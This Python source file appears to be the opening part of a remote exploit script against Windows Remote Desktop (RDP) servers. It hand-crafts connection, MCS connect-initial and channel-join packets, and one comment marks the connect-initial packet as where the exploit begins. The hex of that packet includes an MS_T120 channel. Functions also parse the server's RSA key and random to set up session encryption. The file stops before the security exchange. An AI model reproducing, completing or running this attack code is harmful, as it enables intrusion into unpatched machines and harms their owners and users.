import binascii
import string
import random
import struct
import time

from OpenSSL import *
from Crypto.PublicKey.RSA import construct

import rdp_crypto

def connect_req(name):

    packet =   binascii.unhexlify('0300002e29e00000000000436f6f6b69653a206d737473686173683d')
    packet += name                            #1
    packet += binascii.unhexlify('0d0a0100080000000000')

    return packet


# initial mcs connect pdu this is where the exploit begins 

def mcs_connect_init_pdu():

    packet = (
'030001be02f0807f658201b20401010401010101ff30200202002202020002020200000202000102020000020200010202ffff020200023020020200010202000102020001020200010202000002020001020204200202000230200202ffff0202fc170202ffff0202000102020000020200010202ffff020200020482013f000500147c00018136000800100001c00044756361812801c0d800040008002003580201ca03aa09040000280a00006b0061006c00690000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001800070001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c00c00090000000000000002c00c00030000000000000003c03800040000007264706472000000000000c0726470736e640000000000c04d535f5431323000808000004d535f543132300080800000'
    )

    return binascii.unhexlify(packet)

def erect_domain_req():

    packet = ( '0300000c02f0800400010001' )
    return binascii.unhexlify(packet)
    
def attach_user_req():

    packet = ( '0300000802f08028' )
    return binascii.unhexlify(packet)

# channel join request packets

def get_chan_join_req():

    packet = ( '0300000c02f08038000703' )#was 0503
    start = 'eb'
    channels = []

    for c in range(0, 6): #4
        channelid = int(start, 16) + c
        channel = packet + format(channelid, 'x')
        channels.append(channel)

    return channels

# parce mcs connection resp (in wireshark as ServerData) packet.
# returns an rsa pubkey object and the server random data used later to 
# generate session encryption keys

def parse_mcs_conn_resp(packet):
    
    # 4.1.4 Server MCS Connect Response PDU with GCC Conference Create Response
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/d23f7725-876c-48d4-9e41-8288896a19d3
    # 2.2.1.4.3.1.1.1 RSA Public Key (RSA_PUBLIC_KEY)
    # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/fe93545c-772a-4ade-9d02-ad1e0d81b6af

    # all the next slicing makes sense when looking at above two links

    # find headerType serverSecurityData (0x0c02)
    header_offset = packet.find(b'\x02\x0c')
    sec_data = packet[header_offset:]

    ran_len = int.from_bytes(sec_data[12:12+4], byteorder='little')
    server_ran = sec_data[20:20+ran_len]

    # magic number
    server_cert_offset = packet.find(b'\x52\x53\x41\x31')
    server_cert = packet[server_cert_offset:]

    key_len = int.from_bytes(server_cert[4:8], byteorder='little')
    bit_len = int.from_bytes(server_cert[8:12], byteorder='little')

    rsa_pub_exp = int.from_bytes(server_cert[16:20], byteorder='little')
    rsa_pub_mod = int.from_bytes(server_cert[20:20+key_len], byteorder='little')

    #print('pub_mod = %s' % binascii.hexlify(server_cert[20:20+key_len]))
    #print('keylen: %d' % key_len)
    #print('bitlen: %d' % bit_len)     
    #print('pub exp: %d' % rsa_pub_exp)


    pubkey = construct((rsa_pub_mod, rsa_pub_exp))

    crypt = []
    crypt.append(server_ran)
    crypt.append(pubkey)
    crypt.append(bit_len)

    return crypt

# the securty exchange (send our client random encrypted with servers pub RSA key)